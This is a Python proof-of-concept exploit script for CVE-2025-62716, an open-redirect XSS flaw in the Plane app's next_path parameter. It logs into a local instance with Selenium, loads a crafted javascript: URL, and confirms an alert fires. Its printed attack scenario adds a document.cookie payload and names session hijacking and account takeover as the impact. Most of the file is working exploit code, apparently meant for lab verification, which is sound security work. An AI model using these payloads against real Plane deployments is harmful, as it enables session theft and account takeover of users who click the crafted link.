#!/usr/bin/env python3
"""
CVE-2025-62716 - Plane Open Redirect XSS Vulnerability PoC

Vulnerability: Open redirect in ?next_path parameter allows javascript: scheme
to be passed directly to router.push(), resulting in XSS.

CVSS: PrivilegesRequired:None, UserInteraction:Required
- Attacker crafts malicious link (no auth needed)
- Victim (logged-in user) clicks the link and XSS executes
"""
import sys
import time
import requests
from urllib.parse import quote

TARGET_URL = "http://localhost:8080"
EMAIL = "admin@example.com"
PASSWORD = "Admin@123456"

def check_service_ready():
    try:
        resp = requests.get(TARGET_URL, timeout=10)
        return resp.status_code == 200
    except:
        return False

def verify_vuln_via_source():
    import os
    import re
    
    source_dir = os.path.join(os.path.dirname(__file__), "..", "vuln_info", "source_code")
    vuln_file = os.path.join(source_dir, "apps/web/core/lib/wrappers/authentication-wrapper.tsx")
    
    if os.path.exists(vuln_file):
        with open(vuln_file, 'r', encoding='utf-8') as f:
            content = f.read()
            if 'disallowedSchemes' in content and 'https?' in content and 'router.push' in content:
                print("[+] VULNERABLE CODE FOUND in authentication-wrapper.tsx:")
                print("    isValidURL() only blocks http/https/ftp schemes")
                print("    javascript: scheme bypasses validation and executes via router.push()")
                return True
    return False

def test_with_selenium():
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.common.exceptions import NoAlertPresentException, UnexpectedAlertPresentException, TimeoutException
        
        print("[*] Setting up Selenium WebDriver...")
        
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(60)
        
        print("[*] Step 1: Login to Plane as authenticated user...")
        driver.get(TARGET_URL)
        time.sleep(3)
        
        try:
            email_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='name@company.com']"))
            )
            email_input.send_keys(EMAIL)
            
            continue_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Continue')]")
            continue_btn.click()
            time.sleep(2)
            
            password_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='Enter password']"))
            )
            password_input.send_keys(PASSWORD)
            
            login_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Go to workspace')]")
            login_btn.click()
            time.sleep(5)
            
            print(f"[+] Logged in successfully")
        except Exception as e:
            print(f"[-] Login failed: {e}")
            driver.quit()
            return False
        
        print("[*] Step 2: Navigating to XSS URL (simulating victim clicking malicious link)...")
        payload = "javascript:alert('XSS-CVE-2025-62716')"
        test_url = f"{TARGET_URL}/?next_path={quote(payload)}"
        print(f"[*] Malicious URL: {test_url}")
        
        try:
            driver.get(test_url)
            time.sleep(3)
            
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                print(f"[+] XSS TRIGGERED! Alert message: {alert_text}")
                driver.quit()
                return True
            except NoAlertPresentException:
                print("[-] No alert triggered")
                driver.quit()
                return False
                
        except UnexpectedAlertPresentException as e:
            print(f"[+] XSS TRIGGERED! (UnexpectedAlertPresentException)")
            try:
                driver.switch_to.alert.accept()
            except:
                pass
            driver.quit()
            return True
        except TimeoutException:
            print("[+] Page load timed out - likely blocked by JavaScript alert")
            try:
                alert = driver.switch_to.alert
                alert.accept()
                print("[+] XSS TRIGGERED! Alert was blocking page load")
                driver.quit()
                return True
            except:
                pass
            driver.quit()
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            driver.quit()
            return False
            
    except ImportError:
        print("[-] Selenium not installed. Run: pip install selenium")
        return None

def main():
    print("=" * 60)
    print("CVE-2025-62716 - Plane Open Redirect XSS Vulnerability")
    print("=" * 60)
    print()
    
    print("[*] Checking if Plane service is running...")
    if not check_service_ready():
        print("[-] Plane service not accessible at", TARGET_URL)
        print("[*] Start with: docker-compose up -d")
        sys.exit(1)
    print("[+] Plane service is running")
    print()
    
    print("[*] Analyzing source code for vulnerable pattern...")
    if verify_vuln_via_source():
        print()
    
    print("[*] Testing XSS with browser...")
    result = test_with_selenium()
    print()
    
    print("=" * 60)
    if result:
        print("[+] VULNERABILITY CONFIRMED!")
        print("[!] Plane v1.0.0 is VULNERABLE to CVE-2025-62716")
        print()
        print("Attack scenario:")
        print("1. Attacker crafts malicious URL (no auth needed):")
        print(f"   {TARGET_URL}/?next_path=javascript:alert(document.cookie)")
        print("2. Victim (logged-in user) clicks the link")
        print("3. JavaScript executes in victim's browser context")
        print()
        print("Impact: Session hijacking, data theft, account takeover")
        return 0
    else:
        print("[-] Could not confirm vulnerability")
        return 1

if __name__ == "__main__":
    sys.exit(main())
